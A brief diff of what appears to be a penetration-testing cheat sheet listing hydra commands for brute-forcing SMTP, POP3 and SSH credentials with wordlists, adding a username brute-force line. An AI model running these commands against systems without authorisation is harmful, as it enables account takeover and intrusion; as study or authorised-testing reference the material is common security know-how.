@@ -14,9 +14,11 @@ hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
 
 						SSH
-				Bruteforce  pas=sword
+				Bruteforce password
 hydra -l username -P wordlist IP ssh
 
-				Bruteforce
-				Wordlist Username and Password
+				Bruteforce Username
+hydra -L wordlist -p password IP ssh
+
+				Bruteforce Username and Password
 hydra -L users.txt -P passwords.txt -t 1 -u $ip sshe
